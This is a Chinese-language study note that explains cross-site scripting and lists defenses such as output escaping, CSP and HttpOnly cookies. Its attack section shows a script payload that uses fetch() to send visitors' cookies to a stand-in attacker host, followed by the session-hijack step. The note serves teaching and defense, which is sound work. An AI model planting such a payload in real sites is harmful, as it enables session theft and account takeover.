---
title: 笔记：跨站脚本攻击（XSS）
date: 2025-04-05
categories:
  - 网络攻击
  - 跨站脚本攻击（XSS）
tags: 
author: 霸天
layout: post
---
### 1、起因  

在网页应用中，用户输入的内容（如评论、用户名、搜索框等）通常会被直接显示在页面上。如果网站没有对用户输入的内容进行 **严格的过滤或转义**，攻击者就可以在输入中插入恶意脚本代码。当其他用户浏览页面时，这些脚本会被浏览器当作正常代码执行，导致用户信息被盗或页面被篡改。

---



### 2、攻击  

假设你访问了一个论坛网站 `example-forum.com`，攻击者在评论区输入了以下内容：  
```
<script>
  // 窃取用户的 Cookie 并发送到攻击者的服务器
  fetch('http://malicious.com/steal?cookie=' + document.cookie);
</script>
```  

如果论坛没有过滤这类脚本，这段代码会被保存到页面中。当其他用户打开这条评论时，脚本自动执行，将用户的登录 Cookie 发送到攻击者的服务器。

攻击者拿到 Cookie 后，攻击者可以在自己的浏览器中手动添加：
```
document.cookie = "sessionid=abc123; Domain=example.com; Path=/";
```
这样，当攻击者访问 `example.com` 时，浏览器会携带该 Cookie，服务器会误以为攻击者是受害者，攻击者就能冒充用户登录账户，进行恶意操作（如发帖、转账等）。



---

### 3、防范  

==1.对用户输入进行过滤或转义==  
- **过滤**：移除用户输入中的敏感字符（如 `<`, `>`, `&`, `"`）。  
- **转义**：将特殊字符转换为 HTML 实体（例如 `<` 转成 `&lt;`，`>` 转成 `&gt;`），确保浏览器将其显示为普通文本而非代码。

==2.使用安全的输出方式==  
- 根据输出位置（HTML、JavaScript、URL、CSS）选择不同的转义规则。  
- 避免直接使用 `innerHTML`，优先使用 `textContent` 或安全 API。

==3.启用 Content Security Policy (CSP)==  
通过 HTTP 头部设置 CSP，限制页面只能加载指定来源的脚本、图片等资源。例如：  
```
Content-Security-Policy: default-src 'self'
```  
这表示页面只能加载当前域名的资源，阻止外部恶意脚本执行。

==4.设置 Cookie 的 HttpOnly 属性==  
标记敏感 Cookie 为 `HttpOnly`，禁止 JavaScript 读取 Cookie（防止被盗）：  
```
Set-Cookie: sessionid=123; HttpOnly; Secure
```

==5.避免拼接 HTML 字符串==  
使用现代前端框架（如 React、Vue、Angular），它们默认会自动转义用户输入，降低 XSS 风险。

==6.对富文本内容进行严格过滤==  
如果允许用户输入 HTML（如博客编辑器），使用白名单机制，只保留安全的标签和属性（如 `<b>`, `<img src>`，但移除 `onerror` 等事件属性）。

==7.定期进行安全测试==  
使用工具（如 XSS 扫描器、Burp Suite）或人工审查，检查网站是否存在 XSS 漏洞。

> [!NOTE] 注意事项
> 1. 我们需要采用多种防护措施，因为仅仅为 Cookie 设置 `HttpOnly` 并不能让你高枕无忧。别忘了，除了 JavaScript 之外，还有其他形式的 XSS 脚本可能存在。因此，必须采取多层次的防护策略，以增强安全性。

---


### 4、总结  

就像有人在你家墙上偷偷写了一段“魔法咒语”，每个看到这段咒语的人都会自动执行它。防范 XSS 攻击的核心是 **不信任任何用户输入**，并确保浏览器**不会将输入内容当作代码执行**，防范的关键是：  
1. <font color="#d83931">不让坏人写咒语（过滤输入）</font>  
2. <font color="#d83931">即使写了咒语，也让它变成普通文字（转义输出）</font>  
3. <font color="#d83931">限制咒语生效的条件（CSP、HttpOnly）</font>

---

